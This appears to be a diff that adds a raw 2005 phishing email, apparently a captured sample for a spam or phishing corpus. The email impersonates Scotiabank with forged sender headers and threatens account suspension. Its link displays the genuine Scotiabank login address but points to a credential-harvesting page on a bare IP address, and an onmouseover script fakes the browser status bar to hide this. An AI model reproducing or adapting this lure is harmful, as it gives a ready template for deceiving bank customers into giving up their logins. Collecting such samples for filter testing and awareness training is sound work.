@@ -1,0 +1,99 @@
+Return-Path: <nobody@server29.fastbighost.com>
+Delivered-To: em-ca-bruceg@em.ca
+Received: (qmail 11097 invoked by uid 115); 29 Jun 2005 00:28:29 -0000
+Received: from nobody@server29.fastbighost.com by churchill by uid 64011 with qmail-scanner-1.22 
+ ( Clear:RC:0(67.15.112.25):. 
+ Processed in 0.271502 secs); 29 Jun 2005 00:28:29 -0000
+Received: from server29.fastbighost.com (67.15.112.25)
+  by churchill.factcomp.com with SMTP; 29 Jun 2005 00:28:28 -0000
+Received: from nobody by server29.fastbighost.com with local (Exim 4.51)
+	id 1DnQNu-00058W-SG
+	for bruceg@em.ca; Wed, 29 Jun 2005 00:24:36 +0000
+To: bruceg@em.ca
+Subject: Please check your account activity !
+From: security@scotiabank.com <security@scotiabank.com>
+Reply-To: 
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: 8bit
+Message-Id: <E1DnQNu-00058W-SG@server29.fastbighost.com>
+Date: Wed, 29 Jun 2005 00:24:36 +0000
+X-AntiAbuse: This header was added to track abuse, please include it with any abuse report
+X-AntiAbuse: Primary Hostname - server29.fastbighost.com
+X-AntiAbuse: Original Domain - em.ca
+X-AntiAbuse: Originator/Caller UID/GID - [99 99] / [47 12]
+X-AntiAbuse: Sender Address Domain - server29.fastbighost.com
+X-Source: 
+X-Source-Args: 
+X-Source-Dir: 
+
+<HTML><HEAD>
+<META http-equiv=Content-Type content="text/html; charset=windows-1252">
+<STYLE type=text/css>.Estilo2 {
+	FONT-FAMILY: Arial, Helvetica, sans-serif
+}
+.Estilo5 {
+	FONT-SIZE: 10px; COLOR: #000000
+}
+.Estilo6 {
+	COLOR: #000000
+}
+.Estilo7 {
+	FONT-SIZE: 11px
+}
+</STYLE>
+
+<META content="MSHTML 6.00.2800.1106" name=GENERATOR></HEAD>
+<BODY>
+<P><IMG src="http://www.scotiabank.com/static/en_topnav_logo.gif"
+border=0></P>
+<P><BR><SPAN class=Estilo6><FONT lang=0 face=Arial size=2 FAMILY="SANSSERIF" 
+PTSIZE="10">Dear Valued Scotiabank Customer:<BR><BR>We recently have determined 
+that different computers have logged into your Scotia Bank account, and 
+multiple password failures were present before the logons. We now need you to 
+log into your account and verify your account activity. If this is not completed 
+by <STRONG>June 30, 2005</STRONG> we will be forced to suspend your account 
+indefinitely, as it may have been used for fraudulent purposes. We thank you for 
+your cooperation in this manner.</FONT> </SPAN>
+<P class=Estilo6>To log into your account and verify your account activity, 
+click here: <BR><A 
+onmouseover="window.status='http://66.90.88.104/~demo/cgi-bin/.img/index.php'; return true;" 
+href="http://66.90.88.104/~demo/cgi-bin/.img/index.php" 
+target=_blank>https://www.scotiaonline.scotiabank.com/online/start.jsp?language=</A></P>
+<P class=Estilo6><FONT face="Arial, Helvetica,
+sans-serif" size=2>We 
+appreciate your support and understanding, as we work together to keep Scotiabank a safe place to do business.<BR>Thank you for your patience in 
+this matter.</FONT><BR></P>
+<P class=Estilo6><FONT face="Arial,
+Helvetica, sans-serif" size=2>Trust 
+and Safety Department</FONT><BR><FONT 
+face="Arial,
+Helvetica, sans-serif" size=2>Scotiabank</FONT></P>
+<P><FONT face="Arial, Helvetica,
+sans-serif" size=2><FONT color=#999999 
+size=1>Please do not reply to this e-mail as this is only a notification. Mail 
+sent to this address cannot be answered. </FONT></FONT></P>
+<TABLE cellSpacing=0 cellPadding=0 width=778 border=0>
+  <TBODY>
+  <TR>
+    <TD width=5></TD>
+    <TD class="footerText Estilo2" vAlign=bottom align=left>
+      <P class=Estilo5>This web site is operated by Scotiabank</P></TD>
+    <TD align=right>
+      <P><SPAN class=Estilo7><A class=footerLink 
+      href="javascript:kiosk_OpenWinRTB(%20'http://www.scotiabank.com/cda/content/0,1608,CID1136_LIDen,00.html',%20'RTB',%20kiosk_Type3X,%20kiosk_Type3Y,%20kiosk_Type3R%20)" 
+      valign="bottom">Legal</A>  | <A class=footerLink 
+      href="javascript:kiosk_OpenWinRTB(%20'http://www.scotiabank.com/cda/content/0,1608,CID8308_LIDen,00.html',%20'RTB',%20kiosk_Type2X,%20kiosk_Type2Y,%20kiosk_Type2R%20)" 
+      valign="bottom">Privacy</A>  |  <A 
+      class=footerLink 
+      href="javascript:kiosk_OpenWinRTB(%20'http://www.scotiabank.com/cda/content/0,1608,CID7729_LIDen,00.html',%20'RTB',%20kiosk_Type2X,%20kiosk_Type2Y,%20kiosk_Type2R%20)" 
+      valign="bottom">Security</A></SPAN><SPAN 
+      class=bodyText>  </SPAN> </P></TD></TR>
+  <TR>
+    <TD width=5></TD>
+    <TD class=Estilo5 colSpan=2>© Scotiabank 2005</TD></TR></TBODY></TABLE>
+<P></P></BODY></HTML>
+
+
+
+
